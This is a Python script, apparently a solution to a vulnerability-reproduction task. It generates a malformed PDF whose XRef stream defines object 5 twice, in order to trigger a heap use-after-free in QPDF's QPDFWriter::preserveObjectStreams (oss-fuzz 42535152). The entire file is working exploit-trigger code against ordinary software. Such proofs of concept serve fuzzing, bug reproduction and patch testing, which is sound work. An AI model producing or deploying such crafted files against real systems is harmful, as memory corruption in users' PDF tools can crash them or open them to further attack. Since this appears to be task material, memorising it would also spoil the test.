import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Generate a PDF with a Heap Use After Free vulnerability trigger.
        # Target: oss-fuzz:42535152 (QPDFWriter::preserveObjectStreams)
        # Vulnerability is triggered by multiple entries for the same object ID
        # in the object cache, often via duplicate entries in an XRef stream.

        # PDF Header
        header = b"%PDF-1.5\n%\xe2\xe3\xcf\xd3\n"
        
        # Obj 1: Catalog
        o1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        
        # Obj 2: Pages
        o2 = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        
        # Obj 3: Page
        o3 = b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 600 800] >>\nendobj\n"
        
        # Obj 4: Object Stream containing Obj 5
        # Structure: "id offset" (header) + objects
        # Content: "5 0 " (4 bytes) + "<< >>" (5 bytes)
        # /First must be 4
        stm_content = b"5 0 << >>"
        o4_dict = b"<< /Type /ObjStm /N 1 /First 4 /Length " + str(len(stm_content)).encode() + b" >>"
        o4 = b"4 0 obj\n" + o4_dict + b"\nstream\n" + stm_content + b"\nendstream\nendobj\n"
        
        # Assemble body to calculate offsets
        body = o1 + o2 + o3 + o4
        
        base_offset = len(header)
        off1 = base_offset
        off2 = off1 + len(o1)
        off3 = off2 + len(o2)
        off4 = off3 + len(o3)
        # Obj 6 (XRef Stream) will follow body
        off6 = base_offset + len(body)
        
        # Construct XRef Stream (Obj 6)
        # We use W = [1, 2, 1] for compact representation.
        # Fields: Type (1 byte), Field2 (2 bytes), Field3 (1 byte)
        
        def pack_entry(t, f2, f3):
            return struct.pack('>BHB', t, f2, f3)
        
        # Entries:
        # 0: Free
        row0 = pack_entry(0, 0, 255)
        # 1: Catalog (Type 1, offset, gen 0)
        row1 = pack_entry(1, off1, 0)
        # 2: Pages
        row2 = pack_entry(1, off2, 0)
        # 3: Page
        row3 = pack_entry(1, off3, 0)
        # 4: ObjStm
        row4 = pack_entry(1, off4, 0)
        # 5: Object inside ObjStm 4 (Type 2, stm obj number 4, index 0)
        row5 = pack_entry(2, 4, 0)
        # 6: XRef Stream itself
        row6 = pack_entry(1, off6, 0)
        
        # XRef Stream Data Construction
        # We intentionally define ID 5 twice to trigger the vulnerability.
        # /Index [ 0 6 5 1 6 1 ]
        # Range 1 (0, 6): IDs 0, 1, 2, 3, 4, 5
        # Range 2 (5, 1): ID 5 (Duplicate)
        # Range 3 (6, 1): ID 6
        
        xref_data = (
            row0 + row1 + row2 + row3 + row4 + row5 + # IDs 0-5
            row5 +                                    # ID 5 (Duplicate)
            row6                                      # ID 6
        )
        
        o6_dict = (
            b"<< /Type /XRef /Size 7 /W [ 1 2 1 ] /Root 1 0 R "
            b"/Index [ 0 6 5 1 6 1 ] /Length " + str(len(xref_data)).encode() + b" >>"
        )
        
        o6 = b"6 0 obj\n" + o6_dict + b"\nstream\n" + xref_data + b"\nendstream\nendobj\n"
        
        # Trailer part (startxref)
        trailer = b"\nstartxref\n" + str(off6).encode() + b"\n%%EOF\n"
        
        return header + body + o6 + trailer
